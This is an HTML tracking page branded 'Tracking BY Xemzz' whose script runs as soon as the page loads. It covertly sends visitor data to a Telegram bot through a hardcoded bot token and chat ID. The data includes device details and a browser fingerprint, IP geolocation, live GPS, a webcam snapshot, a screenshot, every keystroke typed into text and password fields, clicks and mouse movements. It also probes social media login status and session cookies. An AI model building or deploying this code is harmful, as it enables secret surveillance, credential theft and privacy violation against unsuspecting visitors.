<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Xemzz - Website</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0f0f0f;
      padding: 20px;
      color: #e0e0e0;
    }
    .terminal-box {
      background: #1a1a1a;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
      max-width: 700px;
      margin: auto;
      border: 1px solid #333;
      position: relative;
    }
    .terminal-header {
      background: #222;
      padding: 8px 15px;
      border-radius: 5px 5px 0 0;
      margin: -20px -20px 15px -20px;
      display: flex;
      align-items: center;
      border-bottom: 1px solid #444;
    }
    .terminal-title {
      font-weight: bold;
      color: #4CAF50;
      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
    }
    .terminal-dots {
      display: flex;
      margin-right: 10px;
    }
    .dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 6px;
    }
    .dot-red { background: #ff5f56; }
    .dot-yellow { background: #ffbd2e; }
    .dot-green { background: #27c93f; }
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    .info-item {
      display: flex;
      margin-bottom: 8px;
      font-size: 14px;
    }
    .info-label {
      color: #4CAF50;
      min-width: 120px;
      margin-right: 10px;
    }
    .info-value {
      color: #e0e0e0;
      word-break: break-all;
    }
    .section-title {
      color: #4CAF50;
      margin: 15px 0 10px 0;
      padding-bottom: 5px;
      border-bottom: 1px solid #333;
      grid-column: span 2;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #666;
      font-size: 12px;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 600px) {
      .info-grid {
        grid-template-columns: 1fr;
      }
      .section-title {
        grid-column: span 1;
      }
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>

  <div class="terminal-box">
    <div class="terminal-header">
      <div class="terminal-dots">
        <div class="dot dot-red"></div>
        <div class="dot dot-yellow"></div>
        <div class="dot dot-green"></div>
      </div>
      <div class="terminal-title">Tracking BY Xemzz</div>
    </div>
    
    <div class="info-grid" id="deviceInfo">
      <div class="section-title">‚öôÔ∏è Device Information</div>
    </div>
    
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    
    <div class="footer">Telegram @XemzzXiterz</div>
  </div>

  <script>
    const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
    const chatId = '7525205684';

    function sendText(text) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
      });
    }

    function sendPhotoBlob(blob, filename = 'image.jpg') {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, filename);
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    function createInfoItem(label, value) {
      const container = document.getElementById('deviceInfo');
      const item = document.createElement('div');
      item.className = 'info-item';
      item.innerHTML = `
        <div class="info-label">${label}</div>
        <div class="info-value">${value}</div>
      `;
      container.appendChild(item);
      return `<b>${label}:</b> ${value}\n`;
    }

    // Enhanced social media tracking
    async function detectSocialMediaLogins() {
      let message = '<b>üì± SOCIAL MEDIA TRACKING</b>\n';
      const socialMediaUrls = {
        'Facebook': 'https://www.facebook.com/',
        'Instagram': 'https://www.instagram.com/',
        'Twitter': 'https://twitter.com/',
        'LinkedIn': 'https://www.linkedin.com/',
        'Google': 'https://accounts.google.com/',
        'YouTube': 'https://www.youtube.com/',
        'TikTok': 'https://www.tiktok.com/',
        'Reddit': 'https://www.reddit.com/',
        'Pinterest': 'https://www.pinterest.com/',
        'WhatsApp': 'https://web.whatsapp.com/',
        'Telegram': 'https://web.telegram.org/',
        'Discord': 'https://discord.com/'
      };

      let detectedAccounts = 0;
      
      for (const [platform, url] of Object.entries(socialMediaUrls)) {
        try {
          const isLoggedIn = await checkLoginStatus(url);
          if (isLoggedIn) {
            message += createInfoItem(`‚úÖ ${platform}`, 'Logged in');
            detectedAccounts++;
            
            // Try to get username if possible
            try {
              const username = await getSocialMediaUsername(url);
              if (username) {
                message += createInfoItem(`üë§ ${platform} Username`, username);
              }
            } catch (e) {
              console.log(`Couldn't get username for ${platform}`);
            }
          } else {
            message += createInfoItem(`‚ùå ${platform}`, 'Not logged in');
          }
        } catch (e) {
          message += createInfoItem(`‚ùì ${platform}`, 'Detection failed');
        }
      }
      
      message += createInfoItem('üîç Total Detected', `${detectedAccounts} social media accounts`);
      return message;
    }

    async function checkLoginStatus(url) {
      try {
        // Try with iframe first
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        await new Promise(resolve => {
          iframe.onload = resolve;
          setTimeout(resolve, 1000);
        });
        
        try {
          // Check for login indicators in the iframe
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          if (doc.body.innerText.includes('Log Out') || 
              doc.body.innerText.includes('Sign Out') ||
              doc.body.innerText.includes('Keluar')) {
            return true;
          }
        } catch (e) {
          // If we can't access iframe content, fall back to other methods
        }
        
        document.body.removeChild(iframe);
      } catch (e) {
        console.log(`Iframe method failed for ${url}`);
      }
      
      // Fallback to checking cookies/localStorage
      try {
        const hasCookies = await checkCookies(url);
        if (hasCookies) return true;
        
        const hasLocalStorage = await checkLocalStorage(url);
        if (hasLocalStorage) return true;
      } catch (e) {
        console.log(`Cookie/localStorage check failed for ${url}`);
      }
      
      return false;
    }

    async function getSocialMediaUsername(url) {
      // This is a simplified version - actual implementation would vary by platform
      try {
        if (url.includes('facebook.com')) {
          const cookies = await getCookiesForDomain('https://www.facebook.com');
          const c_user = cookies.find(c => c.name === 'c_user');
          if (c_user) return `User ID: ${c_user.value}`;
        } else if (url.includes('twitter.com')) {
          const cookies = await getCookiesForDomain('https://twitter.com');
          const auth_token = cookies.find(c => c.name.includes('auth_token'));
          if (auth_token) return 'Twitter user (token detected)';
        }
      } catch (e) {
        return null;
      }
      return null;
    }

    async function checkCookies(url) {
      try {
        const cookies = await getCookiesForDomain(url);
        return cookies.length > 0;
      } catch (e) {
        return false;
      }
    }

    async function checkLocalStorage(url) {
      try {
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        await new Promise(resolve => {
          iframe.onload = resolve;
          setTimeout(resolve, 1000);
        });
        
        const length = iframe.contentWindow?.localStorage?.length;
        document.body.removeChild(iframe);
        return length && length > 0;
      } catch (e) {
        return false;
      }
    }

    function getCookiesForDomain(domain) {
      return new Promise((resolve) => {
        if (typeof chrome !== 'undefined' && chrome.cookies) {
          chrome.cookies.getAll({ url: domain }, (cookies) => {
            resolve(cookies || []);
          });
        } else {
          // Fallback for non-Chrome browsers
          resolve([]);
        }
      });
    }

    // Enhanced browser fingerprinting
    function getBrowserFingerprint() {
      const fingerprint = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        touchSupport: 'ontouchstart' in window,
        fonts: getInstalledFonts(),
        webgl: getWebGLInfo(),
        canvas: getCanvasFingerprint(),
        audioContext: getAudioFingerprint(),
        plugins: getPluginsInfo()
      };
      
      return JSON.stringify(fingerprint, null, 2);
    }

    function getInstalledFonts() {
      const fonts = [
        'Arial', 'Arial Black', 'Courier New', 'Georgia', 'Impact',
        'Times New Roman', 'Trebuchet MS', 'Verdana', 'Comic Sans MS'
      ];
      
      return fonts.filter(font => {
        const span = document.createElement('span');
        span.style.fontFamily = font;
        span.style.fontSize = '72px';
        span.textContent = 'mmmmmmmmmml';
        document.body.appendChild(span);
        const width = span.offsetWidth;
        document.body.removeChild(span);
        return width !== 0;
      });
    }

    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'WebGL not supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
        };
      } catch (e) {
        return 'WebGL error';
      }
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas Fingerprint', 2, 15);
        return canvas.toDataURL();
      } catch (e) {
        return 'Canvas not supported';
      }
    }

    function getAudioFingerprint() {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();
        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
        
        oscillator.type = 'triangle';
        oscillator.connect(analyser);
        analyser.connect(scriptProcessor);
        scriptProcessor.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.start(0);
        
        const audioData = [];
        scriptProcessor.onaudioprocess = function(e) {
          const channelData = e.inputBuffer.getChannelData(0);
          audioData.push(Array.from(channelData.slice(0, 1000)));
        };
        
        setTimeout(() => {
          oscillator.stop();
          audioContext.close();
        }, 100);
        
        return audioData.length > 0 ? 'Audio fingerprint success' : 'Audio fingerprint failed';
      } catch (e) {
        return 'AudioContext not supported';
      }
    }

    function getPluginsInfo() {
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push({
          name: navigator.plugins[i].name,
          description: navigator.plugins[i].description,
          filename: navigator.plugins[i].filename
        });
      }
      return plugins;
    }

    // Enhanced tracking functions
    function trackTyping() {
      const inputFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea');
      
      inputFields.forEach(field => {
        field.addEventListener('input', (e) => {
          sendText(`‚å®Ô∏è <b>Typing detected in ${field.name || 'unknown field'}:</b> ${e.target.value}`);
        });
        
        field.addEventListener('focus', () => {
          sendText(`üîç <b>Field focused:</b> ${field.name || 'unknown field'} (${field.type})`);
        });
      });
    }

    function trackClicks() {
      document.addEventListener('click', (e) => {
        const target = e.target;
        let info = `üñ±Ô∏è <b>Click detected on:</b> ${target.tagName}`;
        
        if (target.id) info += ` (ID: ${target.id})`;
        if (target.className) info += ` (Class: ${target.className})`;
        if (target.href) info += ` (Href: ${target.href})`;
        if (target.innerText) info += `\n<b>Text:</b> ${target.innerText.substring(0, 100)}`;
        
        sendText(info);
      });
    }

    function trackPageChanges() {
      let oldHref = document.location.href;
      
      setInterval(() => {
        if (oldHref !== document.location.href) {
          sendText(`üîÑ <b>Page changed to:</b> ${document.location.href}`);
          oldHref = document.location.href;
        }
      }, 1000);
    }

    async function collectAllInfo() {
      let message = '<b>‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Tracking BY Xemzz ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø</b>\n\n';
      
      // Device Information
      message += '<b>‚öôÔ∏è DEVICE INFORMATION</b>\n';
      const deviceInfo = [
        ['üñ•Ô∏è Device', navigator.userAgent],
        ['üíª Platform', navigator.platform],
        ['üåê Bahasa', navigator.language],
        ['üì∂ Online', navigator.onLine ? 'Online' : 'Offline'],
        ['üì∫ Screen Size', `${screen.width}x${screen.height}`],
        ['ü™ü Window Size', `${window.innerWidth}x${window.innerHeight}`],
        ['üíæ RAM', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'],
        ['üß† CPU Cores', navigator.hardwareConcurrency],
        ['‚úã Touch Support', 'ontouchstart' in window ? '‚úÖ YA' : '‚ùå TIDAK']
      ];

      deviceInfo.forEach(info => {
        message += createInfoItem(info[0], info[1]);
      });

      // Battery Info
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          message += createInfoItem('üîã Battery', `${(battery.level * 100).toFixed(0)}%`);
          message += createInfoItem('üîå Charging', battery.charging ? '‚úÖ YA' : '‚ùå TIDAK');
        } catch (e) {
          message += createInfoItem('üîã Battery', '‚ùå Tidak tersedia');
        }
      }

      // Browser Fingerprint
      message += '\n<b>üñêÔ∏è BROWSER FINGERPRINT</b>\n';
      const fingerprint = getBrowserFingerprint();
      message += createInfoItem('üÜî Fingerprint', 'See full data below');
      
      // Session Information
      message += '\n<b>üìä SESSION INFORMATION</b>\n';
      message += createInfoItem('‚è∞ Waktu Akses', new Date().toString());
      message += createInfoItem('üïí Page Load Time', (performance.now()).toFixed(2) + ' ms');
      message += createInfoItem('üìú History Length', history.length);
      message += createInfoItem('üîó Referrer', document.referrer || 'None');
      message += createInfoItem('üåç URL', window.location.href);
      message += createInfoItem('üìÑ Title', document.title);

      // Location Information
      message += '\n<b>üìç LOCATION INFORMATION</b>\n';
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const offset = new Date().getTimezoneOffset();
      message += createInfoItem('üïì Timezone', tz);
      message += createInfoItem('üß≠ Offset', offset + ' menit');

      // Plugins Information
      message += '\n<b>üß© PLUGINS</b>\n';
      if (navigator.plugins.length > 0) {
        for (let i = 0; i < navigator.plugins.length; i++) {
          message += createInfoItem(`üîå Plugin ${i+1}`, navigator.plugins[i].name);
        }
      } else {
        message += '‚ùå Tidak ada plugins terdeteksi\n';
      }

      // Features Information
      message += '\n<b>‚öôÔ∏è FEATURES</b>\n';
      const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
      features.forEach(f => {
        message += createInfoItem(`‚öôÔ∏è ${f}`, f in navigator ? '‚úÖ YA' : '‚ùå TIDAK');
      });

      // IP Information
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        message += '\n<b>üì° IP INFORMATION</b>\n';
        const ipInfo = [
          ['üì° IP Address', ipData.ip],
          ['üèôÔ∏è Kota', ipData.city],
          ['üó∫Ô∏è Wilayah', ipData.region],
          ['üåé Negara', ipData.country_name],
          ['üè∑Ô∏è Kode Pos', ipData.postal],
          ['üìå Latitude', ipData.latitude],
          ['üìç Longitude', ipData.longitude]
        ];

        ipInfo.forEach(info => {
          message += createInfoItem(info[0], info[1]);
        });
      } catch (e) {
        message += '\n‚ùå Gagal mendapatkan informasi IP\n';
      }

      // Social Media Tracking
      try {
        const socialMediaInfo = await detectSocialMediaLogins();
        message += '\n' + socialMediaInfo;
      } catch (e) {
        message += '\n‚ùå Gagal melacak media sosial\n';
      }

      message += '\n<b>‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Telegram @XemzzXiterz ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø</b>';

      // Send fingerprint as separate message
      setTimeout(() => {
        sendText(`<b>üñêÔ∏è FULL BROWSER FINGERPRINT</b>\n<pre>${fingerprint}</pre>`);
      }, 1000);

      return message;
    }

    // Main execution
    (async () => {
      // First send the comprehensive text report
      const fullReport = await collectAllInfo();
      sendText(fullReport);

      // Then send media (webcam and screenshot)
      try {
        // Webcam snapshot
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => sendPhotoBlob(blob, 'üì∏_camera.jpg'), 'image/jpeg');
        
        // Stop the video stream
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.log('Webcam access denied');
      }

      // Screenshot after a delay
      setTimeout(() => {
        html2canvas(document.body).then(canvas => {
          canvas.toBlob(blob => sendPhotoBlob(blob, 'üñºÔ∏è_screenshot.jpg'), 'image/jpeg');
        });
      }, 5000);

      // GPS tracking if available
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(pos => {
          const gpsText = `<b>üì° LIVE GPS TRACKING</b>\n` +
                         `<b>üìå Lat:</b> ${pos.coords.latitude}\n` +
                         `<b>üìç Lng:</b> ${pos.coords.longitude}\n` +
                         `<b>üéØ Akurasi:</b> ${pos.coords.accuracy}m`;
          sendText(gpsText);
        }, err => {
          console.log('GPS access denied');
        }, { enableHighAccuracy: true });
      }

      // Enhanced tracking
      trackTyping();
      trackClicks();
      trackPageChanges();

      // Mouse movement tracking
      document.addEventListener('mousemove', (e) => {
        sendText(`üñ±Ô∏è <b>Mouse Position:</b> (${e.clientX}, ${e.clientY})`);
      });

      // Idle time tracking
      let idleStart = Date.now();
      let idleTimer;
      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
        window.addEventListener(evt, () => {
          const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
          sendText(`üò¥ <b>User idle selama:</b> ${idleTime} detik`);
          idleStart = Date.now();
          clearTimeout(idleTimer);
          idleTimer = setTimeout(() => {
            sendText('üí§ <b>User diem kayak mayat selama 60 detik</b>');
          }, 60000);
        });
      });
    })();

  </script>

</body>
</html>